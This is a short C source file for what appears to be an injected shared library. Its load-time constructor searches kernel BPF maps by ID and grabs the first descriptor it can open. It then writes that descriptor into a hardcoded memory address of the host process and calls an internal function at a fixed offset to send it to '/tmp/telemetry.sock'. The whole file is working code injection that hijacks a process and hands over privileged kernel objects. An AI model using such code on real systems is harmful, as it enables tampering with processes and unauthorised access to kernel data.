#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <sys/syscall.h>

int bpf(int cmd, union bpf_attr *attr, unsigned int size) {
    return syscall(SYS_bpf, cmd, attr, size);
}

void __attribute__((constructor)) init() {
    unsigned long base = 0x555555554000;

    // Find our map FD
    union bpf_attr attr = {};
    unsigned int id = 0;
    unsigned int next_id = 0;
    int map_fd = -1;

    while (1) {
        attr.start_id = id;
        attr.next_id = 0;
        if (bpf(BPF_MAP_GET_NEXT_ID, &attr, sizeof(attr)) < 0) {
            break;
        }
        next_id = attr.next_id;

        union bpf_attr attr2 = {};
        attr2.map_id = next_id;
        int fd = bpf(BPF_MAP_GET_FD_BY_ID, &attr2, sizeof(attr2));
        if (fd >= 0) {
            map_fd = fd;
            break;
        }
        id = next_id;
    }

    if (map_fd < 0) {
        printf("No map FD found!\n");
        exit(1);
    }

    printf("Found map FD: %d\n", map_fd);

    // Populate 0x106070 with map_fd
    int *map_fds_array = (int *)(base + 0x106070);
    map_fds_array[0] = map_fd;
    map_fds_array[1] = 0;

    void (*bpf_send_map_fds)(const char*) = (void (*)(const char*))(base + 0x7e540);

    // Ensure stack alignment and call
    // We will just call it, constructor should be aligned.
    printf("Calling bpf_send_map_fds...\n");
    bpf_send_map_fds("/tmp/telemetry.sock");
    printf("Done!\n");
    exit(0);
}
